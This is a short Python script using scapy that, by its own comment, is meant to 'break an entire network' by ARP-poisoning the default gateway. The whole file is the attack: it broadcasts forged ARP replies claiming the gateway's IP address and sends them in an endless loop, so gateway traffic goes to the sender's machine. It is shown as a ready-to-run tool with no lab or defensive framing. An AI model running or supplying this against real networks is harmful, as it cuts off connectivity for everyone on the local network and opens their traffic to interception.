
#!/usr/bin/env python3
#This script will break an entire network by poisoning the default gateway and poiting it back to your machine.
from scapy.all import *


#Default gateway IP
client_b_IP="192.168.33.1"

E = Ether()
#Broadcast MAC address
E.dst="ff:ff:ff:ff:ff:ff"
A = ARP()
#Broadcast MAC address
A.hwdst="ff:ff:ff:ff:ff:ff"
#A.hwdst="C0:18:03:C8:63:19"

A.psrc = client_b_IP
A.pdst = client_b_IP
A.op = 2 # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
print(pkt)
print(get_if_list())
#If using Ethernet USB dongle, you need to make sure this is enabled. show_interfaces() can be used to see the name.

#iface="Realtek USB GbE Family Controller #5"
#iface="Intel(R) Ethernet Connection (4) I219-LM"

#x=1
#while x < 300:
while True:
    #if using ethernet donglge
    #sendp(pkt,iface=iface)
    sendp(pkt)
   # x = x + 1
